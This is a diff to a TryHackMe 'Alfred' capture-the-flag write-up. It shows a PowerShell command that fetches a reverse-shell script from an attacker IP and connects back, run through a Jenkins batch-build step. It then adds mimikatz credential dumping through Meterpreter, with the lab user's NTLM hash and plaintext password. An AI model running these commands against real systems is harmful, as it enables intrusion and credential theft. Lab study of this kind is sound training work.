@@ -14,7 +14,7 @@ Find a feature of the tool that allows you to execute commands on the underlying
 
 You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server
 
-Open http://targetIP:8080 --> project --> Configure --> Execute with batch
+Open http://targetIP:8080 --> project --> Configure --> Build --> Execute Windows batch command
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.88.227:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.88.227 -Port 1234
 
 on my machine
@@ -212,7 +212,57 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 
+Post Exploitation
+mimikatz extract
 
+meterpreter > load kiwi 
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain  NTLM                              SHA1
+--------  ------  ----                              ----
+bruce     alfred  3ea0013c7eb26d63606673c34322b4ae  3c478aac77898c4e1addab670555ecb27af871d8
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+ALFRED$   WORKGROUP  (null)
+bruce     alfred     CEB6f5EcfQWYDWRY
+
+tspkg credentials
+=================
+
+Username  Domain  Password
+--------  ------  --------
+bruce     alfred  CEB6f5EcfQWYDWRY
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+alfred$   WORKGROUP  (null)
+bruce     alfred     CEB6f5EcfQWYDWRY
+
+done!
+thanks thm
 
 https://tryhackme.com/room/alfred
 https://steflan-security.com/tryhackme-alfred-walkthrough/
